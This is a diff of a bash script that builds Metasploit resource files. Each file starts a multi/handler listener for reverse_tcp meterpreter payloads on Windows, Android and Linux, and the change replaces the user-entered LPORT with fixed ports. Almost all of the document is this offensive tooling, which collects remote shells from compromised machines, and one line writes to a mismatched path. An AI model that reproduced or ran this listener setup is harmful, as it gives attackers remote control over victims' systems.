@@ -144,26 +144,25 @@ echo
 read -n1 -r -p "$(echo -e $BBlue "If you finished press enter to continue...")" key
 echo
 	read -p "Enter your LHOST: $(echo -e $BWhite"")" lhost
-	read -p "$(echo -e $BBlue"Enter your LPORT: ")$(echo -e $BWhite )" lport
 				echo "use exploit/multi/handler" > tools/msfrc/Listening1.rc
 			echo "set payload windows/meterpreter/reverse_tcp" >> tools/msfrc/Listening1.rc
 			echo "set LHOST $lhost" >> tools/msfrc/Listening1.rc
-			echo "set LPORT $lport" >> tools/msfrc/Listening1.rc
+			echo "set LPORT 4444" >> tools/msfrc/Listening1.rc
 			echo "exploit" >> tools/msfrc/Listening1.rc
 			echo "use exploit/multi/handler" > tools/msfrc/Listening2.rc
 			echo "set payload android/meterpreter/reverse_tcp" >> tools/msfrc/Listening2.rc
 			echo "set LHOST $lhost" >> tools/msfrc/Listening2.rc
-			echo "set LPORT $lport" >> tools/msfrc/Listening2.rc
+			echo "set LPORT 5555" >> tools/msfrc/Listening2.rc
 			echo "exploit" >> tools/Listening2.rc
 			echo "use exploit/multi/handler" > tools/msfrc/Listening3.rc
 			echo "set payload linux/x64/meterpreter/reverse_tcp" >> tools/msfrc/Listening3.rc
 			echo "set LHOST $lhost" >> tools/msfrc/Listening3.rc
-			echo "set LPORT $lport" >> tools/msfrc/Listening3.rc
+			echo "set LPORT 6666" >> tools/msfrc/Listening3.rc
 			echo "exploit" >> tools/msfrc/Listening3.rc	
 			echo "use exploit/multi/handler" > tools/msfrc/Listening4.rc
 			echo "set payload linux/x86/meterpreter/reverse_tcp" >> tools/msfrc/Listening4.rc
 			echo "set LHOST $lhost" >> tools/msfrc/Listening4.rc
-			echo "set LPORT $lport" >> tools/msfrc/Listening4.rc
+			echo "set LPORT 7777" >> tools/msfrc/Listening4.rc
 			echo "exploit" >> tools/msfrc/Listening4.rc
 	read -p "$(echo -e $BBlue"Enter your os tybe (x64,x86): ")$(echo -e $BWhite"")" tybe
 	read -p "$(echo -e $BBlue"Enter your Terminal name (kde,gnome,lxde,xfce): ")$(echo -e $BWhite"")" terminal
